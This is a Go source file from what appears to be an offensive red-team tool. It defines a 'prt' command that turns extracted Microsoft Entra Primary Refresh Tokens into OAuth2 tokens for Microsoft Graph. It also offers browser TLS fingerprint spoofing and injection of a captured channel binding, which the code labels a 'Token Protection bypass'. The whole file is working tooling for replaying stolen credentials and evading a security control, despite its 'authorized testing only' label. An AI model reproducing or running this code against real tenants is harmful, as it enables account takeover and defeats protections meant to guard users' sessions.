package cli

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/spf13/cobra"

	"github.com/Debajyoti0-0/aether/internal/engine/token"
	"github.com/Debajyoti0-0/aether/internal/protocol/msoapx"
	"github.com/Debajyoti0-0/aether/internal/transport"
)

var prtCmd = &cobra.Command{
	Use:   "prt",
	Short: "Primary Refresh Token operations",
	Long:  "Convert extracted PRTs into usable OAuth2 tokens (authorized testing only).",
}

var prtConvertCmd = &cobra.Command{
	Use:   "convert",
	Short: "Convert a PRT to OAuth2 tokens",
	RunE:  runPRTConvert,
}

var prtShowCmd = &cobra.Command{
	Use:   "show",
	Short: "Display PRT metadata without exchanging",
	RunE:  runPRTShow,
}

var (
	prtFile      string
	prtOutput    string
	prtResource  string
	prtClientID  string
	prtPreset    string
	prtTimeout   int
	prtTenant    string
	prtBinding   string
)

func init() {
	rootCmd.AddCommand(prtCmd)
	prtCmd.AddCommand(prtConvertCmd)
	prtCmd.AddCommand(prtShowCmd)

	prtConvertCmd.Flags().StringVar(&prtFile, "prt-file", "", "PRT JSON file (required)")
	prtConvertCmd.Flags().StringVar(&prtOutput, "output", "", "Output file for tokens (JSON)")
	prtConvertCmd.Flags().StringVar(&prtResource, "resource", "https://graph.microsoft.com/.default", "Resource/scope to request")
	prtConvertCmd.Flags().StringVar(&prtClientID, "client-id", token.DefaultClientID, "Public client id")
	prtConvertCmd.Flags().StringVar(&prtTenant, "tenant", "", "Tenant override (defaults to PRT tenant)")
	prtConvertCmd.Flags().StringVar(&prtPreset, "browser-preset", "chrome", "TLS fingerprint preset (chrome, edge, firefox)")
	prtConvertCmd.Flags().StringVar(&prtBinding, "tls-binding", "", "Channel binding dump (Token Protection bypass)")
	prtConvertCmd.Flags().IntVar(&prtTimeout, "timeout", 30, "Request timeout seconds")
	_ = prtConvertCmd.MarkFlagRequired("prt-file")

	prtShowCmd.Flags().StringVar(&prtFile, "prt-file", "", "PRT JSON file (required)")
	_ = prtShowCmd.MarkFlagRequired("prt-file")
}

func runPRTConvert(cmd *cobra.Command, args []string) error {
	if _, err := transportClient(prtPreset, prtTimeout); err != nil {
		return err
	}

	prt, err := token.LoadPRT(prtFile)
	if err != nil {
		return err
	}
	if prtTenant != "" {
		prt.TenantID = prtTenant
	}

	// Token Protection bypass: inject the original tls-unique binding.
	var binding *msoapx.ChannelBinding
	if prtBinding != "" {
		bindData, err := os.ReadFile(prtBinding)
		if err != nil {
			return fmt.Errorf("read tls binding: %w", err)
		}
		binding, err = msoapx.LoadChannelBinding(string(bindData))
		if err != nil {
			return fmt.Errorf("tls binding: %w", err)
		}
		fmt.Fprintf(os.Stderr, "Channel binding loaded (Token Protection spoof active): %s\n", binding.GenerateHeader()[:32]+"...")
	}

	client, err := msoapx.NewClient(prtPreset, time.Duration(prtTimeout)*time.Second)
	if err != nil {
		return err
	}
	// Wire the binding into the actual exchange (Token Protection bypass).
	var bind *msoapx.ChannelBinding
	if prtBinding != "" {
		bindData, err := os.ReadFile(prtBinding)
		if err != nil {
			return fmt.Errorf("read tls binding: %w", err)
		}
		bind, err = msoapx.LoadChannelBinding(string(bindData))
		if err != nil {
			return fmt.Errorf("tls binding: %w", err)
		}
	}

	converter := token.NewPRTConverter(client)
	converter.Binding = bind
	tokens, err := converter.ConvertPRTToOAuth(context.Background(), prt, prtClientID, prtResource)
	if err != nil {
		return err
	}

	if err := saveTokens(tokens, prtOutput); err != nil {
		return err
	}
	return printTokens(tokens)
}

func runPRTShow(cmd *cobra.Command, args []string) error {
	prt, err := token.LoadPRT(prtFile)
	if err != nil {
		return err
	}

	out := map[string]string{
		"device_id":   prt.DeviceID,
		"tenant_id":   prt.TenantID,
		"user_id":     prt.UserID,
		"cookie_len":  fmt.Sprint(len(prt.Cookie)),
		"has_session": fmt.Sprint(prt.SessionKey != ""),
	}
	return json.NewEncoder(os.Stdout).Encode(out)
}

func saveTokens(tokens interface{}, output string) error {
	data, err := json.MarshalIndent(tokens, "", "  ")
	if err != nil {
		return err
	}
	if output != "" {
		return os.WriteFile(output, data, 0o600)
	}
	return nil
}

func printTokens(tokens interface{}) error {
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	return enc.Encode(tokens)
}

func transportClient(preset string, timeout int) (interface{}, error) {
	if _, err := transport.NewClient(preset, time.Duration(timeout)*time.Second); err != nil {
		return nil, err
	}
	return nil, nil
}
